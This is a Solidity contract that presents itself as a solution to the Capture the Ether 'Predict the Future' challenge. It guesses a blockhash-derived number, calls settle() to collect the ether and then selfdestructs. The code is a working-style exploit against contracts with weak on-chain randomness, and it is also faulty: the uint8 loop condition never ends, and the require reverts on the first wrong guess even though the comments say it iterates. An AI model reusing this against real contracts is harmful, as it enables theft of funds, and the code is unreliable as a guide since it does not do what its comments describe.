pragma solidity ^0.4.21;

//     *****SOLUTION*****

contract CaptureTheEther {
    PredictTheFutureChallenge future = PredictTheFutureChallenge(/* INSERT CONTRACT ADDRESS */);
    
    function destroy() public {
        selfdestruct(msg.sender);
    }
    
    //Iterate through the for loop to try and find the correct value
    //This may be gas intensive
    function capture() public payable {
        
        for (uint8 guess=0; guess<256; guess++) { // uint8 has a max of 256 integers, 0 - 255, 256 in total
        
           future.lockInGuess.value(msg.value)(guess); // lock in a guess
           
           // check if guess is correct, otherwise re-iterate through the for loop with a new guess
           require(guess == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
           
           future.settle(); // Once the correct guess is found, pass it through settle() function to collect the ether
           
           destroy(); // Once the ether is collect, no need for the 'for' loop
        }
    }
    
    function() payable public {
        
    }
    
}
